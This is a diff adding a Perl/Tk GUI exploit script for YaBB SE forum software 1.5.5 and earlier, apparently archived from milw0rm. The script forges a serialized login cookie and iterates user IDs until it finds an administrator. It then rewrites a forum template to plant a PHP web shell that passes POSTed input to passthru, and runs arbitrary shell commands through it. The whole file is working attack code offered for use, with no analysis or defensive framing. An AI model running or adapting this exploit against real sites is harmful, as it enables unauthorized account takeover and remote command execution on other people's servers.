@@ -1,0 +1,592 @@
+#!/usr/bin/perl
+
+## YaBB SE version <= 1.5.5 commands execution exploit by RST/GHC
+## GUI version =)))
+##  
+##        THIS IS UNPUBLISHED RST/GHC EXPLOIT CODE
+##                   KEEP IT PRIVATE
+##
+## (c)oded by 1dt.w0lf
+## http://rst.void.ru
+## http://ghc.ru
+
+
+use Tk;
+use Tk::Menu;
+use LWP::UserAgent;
+
+$top = MainWindow->new();
+$top->title("r57yabbse155ceGUI");
+$top->resizable(0,0);
+
+$url = 'http://server/forum/index.php';
+$id  = '1';
+$cookie_name = 'YaBBSE155';
+$cmd = 'ls -la; id; uname -a;';
+$_button_1_text = 'Found admin ID';
+$found_admin_id = \&found_admin_id_start;
+$stop = 0;
+
+$xpl = LWP::UserAgent->new() or die;
+
+Dialog::ui($top);
+
+Dialog::run() if defined &Dialog::run;
+
+Tk::MainLoop();
+
+sub get_cookie_name()
+ {
+ $_text_1->delete("0.0",'end');
+ $_text_1->insert('end', "[~] Try get cookie name\n");
+ $res = $xpl->get($url.'?action=logout&sesc=1','Cookie'=>'PHPSESSID=1');
+ if(!$res->is_success) { &connect_error(); }
+ else
+  {
+  $cookie = '';
+  if($res->as_string =~ /Set-Cookie: (.*)=deleted;/) { $cookie = $1; }
+  if($cookie ne '') { $_text_1->insert('end', "[+] COOKIE NAME: ".$cookie."\n"); $cookie_name = $cookie; }
+  else { $_text_1->insert('end', "[-] Can't get cookie name\n"); }
+  }
+ }
+
+sub found_admin_id_stop()
+ {
+ $stop = 1;
+ $_button_1_text = 'Found admin ID';
+ $found_admin_id = \&found_admin_id_start;
+ }
+
+sub found_admin_id_start()
+ {
+ $_button_1_text = '     Stop     ';
+ $found_admin_id = \&found_admin_id_stop;
+ $_text_1->delete("0.0",'end');
+ $_text_1->insert('end', "[~] Try found admin ID\n");
+ $success = 0;
+ $error = 0;
+ while(1)
+  {
+  last if $stop;  
+  if(&login()){
+  if(&user_exist())
+   {
+   if(&user_admin()) { $success = 1; last; }
+   }
+  }
+  if($error) { last; }
+  $id++;
+  }
+ if($success) { $_text_1->insert('end', "[+] ADMIN ID: ".$id."\n"); }
+ $_button_1_text = 'Found admin ID';
+ $found_admin_id = \&found_admin_id_start;
+ $stop = 0;
+ }
+
+sub create_cookie()
+ {
+ return $cookie_name.'=a%3A2%3A%7Bi%3A0%3Bs%3A'.length($id).'%3A%22'.$id.'%22%3Bi%3A1%3Bb%3A1%3B%7D';   
+ }
+
+sub login()
+ {
+ $_text_1->insert('end', "[~] Try login with USER ID: ".$id."\n");
+ $top->update();
+ $res = $xpl->get($url,cookie => &create_cookie);
+ if(!$res->is_success) { $error = 1; &connect_error(); return 0; }
+ else { return 1; }
+ }
+
+sub user_exist()
+ {
+ if($res->as_string =~ /action=profile/) { $_text_1->insert('end', "[+] Successfully logged in\n"); return 1; }
+ else { $_text_1->insert('end', "[-] User with this ID not exists\n"); return 0; }
+ $top->update();
+ }
+ 
+sub user_admin()
+ {
+ if($res->as_string =~ /action=admin/) { $_text_1->insert('end', "[+] This user have admin rights\n"); return 1; }
+ else { $_text_1->insert('end', "[-] This user don't have admin rights\n"); return 0; }  
+ $top->update();
+ }
+
+sub create_shell()
+ {
+ $_text_1->delete("0.0",'end');  
+ $_text_1->insert('end', "[~] Try create shell\n");
+ $res = $xpl->get($url.'?action=modtemp',cookie => &create_cookie);
+ if(!$res->is_success) { &connect_error(); }
+ else
+  {
+  $_text_1->insert('end', "[~] Try get & edit template\n"); 
+  @data = split(/\n/,$res->content());
+  $t = $sc = '';
+  $already = 0;
+  foreach(@data)
+   {
+   if(/input type="hidden" name="sc" value="([^"]*)"/) { $sc = $1; }   
+   if(/RST_GHC_TEMPLATE/) { $already = 1; last; }   
+   if(/(.*)<\/textarea>/) { $t .= $1."\n"; $p = 0; }
+   $t .= $_."\n" if $p;
+   if(/<textarea[^>]*name="template"[^>]*>(.*)/) { $t .= $1."\n"; $p = 1; }
+   }
+  if($already)
+   {
+   $_text_1->insert('end', "[!] Template already modified\n[+] Skip Template editing\n");  
+   }
+  else
+   {
+   $_text_1->insert('end', "[~] Edit Template\n");
+   $new_t = '<? if(isset($_POST[\'RSTGHC\'])) { echo "RST_GHC_TEMPLATE"; passthru($_POST[\'RSTGHC\']); echo "RST_GHC_TEMPLATE"; } ?>';
+
+   $t =~ s/&lt;/</g;
+   $t =~ s/&gt;/>/g;
+   $t =~ s/&quot;/"/g;
+   $t =~ s/&amp;/&/g;
+   $t =~ s/&nbsp;/ /g;
+
+   $new_t .= $t;
+
+   $res = $xpl->post($url,
+                  [
+                  'action'   => 'modtemp2',
+                  'submit'   => 'Save',
+                  'template' => $new_t,
+                  'sc'       => $sc,
+                  ]
+                  ,cookie => 'PHPSESSID='.$sc.';'.&create_cookie);
+    }
+   $_text_1->insert('end', "[+] DONE!\n[!] Now you can execute commands\n");
+ 
+  }
+ }
+
+sub execute_command()
+ {
+ $_text_1->delete("0.0",'end');
+ $_text_1->insert('end',"[~] Try execute command\n");
+ $res = $xpl->post($url,['RSTGHC'=>$cmd]);
+ if(!$res->is_success) { &connect_error(); }
+ else
+  {
+  @rez = split("RST_GHC_TEMPLATE",$res->content);
+  $_text_1->insert('end',@rez[1]);
+  $_text_1->insert('end',"[+] EOF\n");
+  }
+ }
+ 
+sub connect_error()
+ {
+ $_text_1->insert('end', "[-] Error: ".$res->status_line."\n");  
+ }
+
+sub Dialog::ui {
+    our($root) = @_;
+
+
+    # Widget Initialization
+    $_frame_6 = $root->Frame(
+    );
+    $_frame_12 = $root->Frame(
+    );
+    $_frame_13 = $root->Frame(
+    );
+    $_label_1 = $root->Label(
+    -font => 'Webdings 24 bold',
+    -text => "!",
+    );
+    $_label_2 = $root->Label(
+    -activebackground => "#ff0000",
+    -activeforeground => "#ff0000",
+    -font => '{Courier New} 8',
+    -foreground => "#ff0000",
+    -text => "YaBB SE <= 1.5.5 command execution exploit by RST/GHC",
+    );
+    $_label_5 = $root->Label(
+    -font => '{Courier New} 8',
+    -text => "PATH TO INDEX.PHP:",
+    );
+    $_label_6 = $root->Label(
+    -font => '{Courier New} 8',
+    -text => "ADMIN ID:",
+    );
+    $_entry_4 = $root->Entry(
+    -font => '{Courier New} 8',
+    -relief => "groove",
+    -textvariable => \$url,
+    -width => 65,
+    );
+    $_entry_7 = $root->Entry(
+    -font => '{Courier New} 8',
+    -relief => "groove",
+    -textvariable => \$id,
+    );
+    our($_entry_8) = $root->Entry(
+    -font => '{Courier New} 8',
+    -relief => "groove",
+    -textvariable => \$cookie_name,
+    );
+    $_label_8 = $root->Label(
+    -font => '{Courier New} 8',
+    -text => "COOKIE NAME:",
+    );
+    $_button_2 = $root->Button(
+    -font => '{Courier New} 8',
+    -height => 1,
+    -relief => "groove",
+    -text => "Get cookie name",
+    );
+    $_button_3 = $root->Button(
+    -font => '{Courier New} 8',
+    -relief => "groove",
+    -text => "Create shell",
+    );
+    $_label_10 = $root->Label(
+    -font => '{Courier New} 8',
+    -text => "COMMAND FOR EXECUTE:",
+    );
+    $_button_6 = $root->Button(
+    -font => '{Courier New} 8',
+    -relief => "groove",
+    -text => "Execute command",
+    );
+    $_entry_11 = $root->Entry(
+    -font => '{Courier New} 8',
+    -relief => "groove",
+    -textvariable => \$cmd,
+    -width => 65,
+    );
+    $_text_1 = $root->Scrolled (
+    'Text' ,
+    -scrollbars => 'e' ,
+    -wrap => 'word',
+    -font => '{Courier New} 8',
+    -height => 0,
+    -relief => "groove",
+    -width => 0,
+
+    );
+    $_button_1 = $root->Button(
+    -font => '{Courier New} 8',
+    -relief => "groove",
+    -textvariable => \$_button_1_text,
+    );
+    $_label_3 = $root->Label(
+    -anchor => "nw",
+    -compound => "left",
+    -font => '{Courier New} 8',
+    -text => "* 1 default for admin",
+    );
+    $_label_4 = $root->Label(
+    -anchor => "w",
+    -font => '{Courier New} 8',
+    -justify => "left",
+    -text => "* YaBBSE155 default for version 1.5.5",
+    );
+    $_label_7 = $root->Label(
+    -font => '{Courier New} 8',
+    -text => "(c)oded by 1dt.w0lf , RST/GHC , http://rst.void.ru , http://ghc.ru",
+    );
+
+    # widget commands
+
+
+    $_button_2->configure(
+    -command => \&get_cookie_name
+    );
+    $_button_3->configure(
+    -command => \&create_shell
+    );
+    $_button_6->configure(
+    -command => \&execute_command
+    );
+    $_button_1->configure(
+    -command => \$found_admin_id
+    );
+
+
+    # Geometry Management
+    $_frame_6->grid(
+    -in     => $root,
+    -column => 3,
+    -row    => 3,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "ew"
+    );
+    $_frame_12->grid(
+    -in     => $root,
+    -column => 1,
+    -row    => 3,
+    -columnspan => 2,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "ne"
+    );
+    $_frame_13->grid(
+    -in     => $root,
+    -column => 3,
+    -row    => 4,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => ""
+    );
+    $_label_1->grid(
+    -in     => $root,
+    -column => 2,
+    -row    => 1,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => ""
+    );
+    $_label_2->grid(
+    -in     => $root,
+    -column => 3,
+    -row    => 1,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => ""
+    );
+    $_label_5->grid(
+    -in     => $root,
+    -column => 1,
+    -row    => 2,
+    -columnspan => 2,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "ne"
+    );
+    $_label_6->grid(
+    -in     => $_frame_12,
+    -column => 1,
+    -row    => 1,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "e"
+    );
+    $_entry_4->grid(
+    -in     => $root,
+    -column => 3,
+    -row    => 2,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "w"
+    );
+    $_entry_7->grid(
+    -in     => $_frame_6,
+    -column => 1,
+    -row    => 1,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "w"
+    );
+    $_entry_8->grid(
+    -in     => $_frame_6,
+    -column => 1,
+    -row    => 2,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "nw"
+    );
+    $_label_8->grid(
+    -in     => $_frame_12,
+    -column => 1,
+    -row    => 2,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "se"
+    );
+    $_button_2->grid(
+    -in     => $_frame_13,
+    -column => 1,
+    -row    => 1,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "e"
+    );
+    $_button_3->grid(
+    -in     => $_frame_13,
+    -column => 3,
+    -row    => 1,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "e"
+    );
+    $_label_10->grid(
+    -in     => $_frame_12,
+    -column => 1,
+    -row    => 3,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "se"
+    );
+    $_button_6->grid(
+    -in     => $_frame_13,
+    -column => 4,
+    -row    => 1,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "e"
+    );
+    $_entry_11->grid(
+    -in     => $_frame_6,
+    -column => 1,
+    -row    => 3,
+    -columnspan => 2,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "nw"
+    );
+    $_text_1->grid(
+    -in     => $root,
+    -column => 1,
+    -row    => 5,
+    -columnspan => 3,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "news"
+    );
+    $_button_1->grid(
+    -in     => $_frame_13,
+    -column => 2,
+    -row    => 1,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => ""
+    );
+    $_label_3->grid(
+    -in     => $_frame_6,
+    -column => 2,
+    -row    => 1,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "ew"
+    );
+    $_label_4->grid(
+    -in     => $_frame_6,
+    -column => 2,
+    -row    => 2,
+    -columnspan => 1,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "ew"
+    );
+    $_label_7->grid(
+    -in     => $root,
+    -column => 1,
+    -row    => 6,
+    -columnspan => 3,
+    -ipadx => 0,
+    -ipady => 0,
+    -padx => 0,
+    -pady => 0,
+    -rowspan => 1,
+    -sticky => "nw"
+    );
+
+
+    # Resize Behavior
+    $root->gridRowconfigure(1, -weight => 0, -minsize => 40, -pad => 0);
+    $root->gridRowconfigure(2, -weight => 0, -minsize => 12, -pad => 0);
+    $root->gridRowconfigure(3, -weight => 0, -minsize => 2, -pad => 0);
+    $root->gridRowconfigure(4, -weight => 0, -minsize => 40, -pad => 0);
+    $root->gridRowconfigure(5, -weight => 1, -minsize => 250, -pad => 0);
+    $root->gridRowconfigure(6, -weight => 0, -minsize => 27, -pad => 0);
+    $root->gridColumnconfigure(1, -weight => 0, -minsize => 5, -pad => 0);
+    $root->gridColumnconfigure(2, -weight => 1, -minsize => 54, -pad => 0);
+    $root->gridColumnconfigure(3, -weight => 0, -minsize => 112, -pad => 0);
+    $_frame_12->gridRowconfigure(1, -weight => 0, -minsize => 2, -pad => 0);
+    $_frame_12->gridRowconfigure(2, -weight => 0, -minsize => 2, -pad => 0);
+    $_frame_12->gridRowconfigure(3, -weight => 0, -minsize => 2, -pad => 0);
+    $_frame_12->gridColumnconfigure(1, -weight => 0, -minsize => 40, -pad => 0);
+    $_frame_13->gridRowconfigure(1, -weight => 0, -minsize => 2, -pad => 0);
+    $_frame_13->gridColumnconfigure(1, -weight => 0, -minsize => 5, -pad => 0);
+    $_frame_13->gridColumnconfigure(2, -weight => 0, -minsize => 40, -pad => 0);
+    $_frame_13->gridColumnconfigure(3, -weight => 0, -minsize => 40, -pad => 0);
+    $_frame_13->gridColumnconfigure(4, -weight => 0, -minsize => 40, -pad => 0);
+    $_frame_6->gridRowconfigure(1, -weight => 0, -minsize => 2, -pad => 0);
+    $_frame_6->gridRowconfigure(2, -weight => 0, -minsize => 11, -pad => 0);
+    $_frame_6->gridRowconfigure(3, -weight => 0, -minsize => 2, -pad => 0);
+    $_frame_6->gridColumnconfigure(1, -weight => 0, -minsize => 2, -pad => 0);
+    $_frame_6->gridColumnconfigure(2, -weight => 1, -minsize => 54, -pad => 0);
+}
+
+1;
+
+# milw0rm.com [2008-01-22]
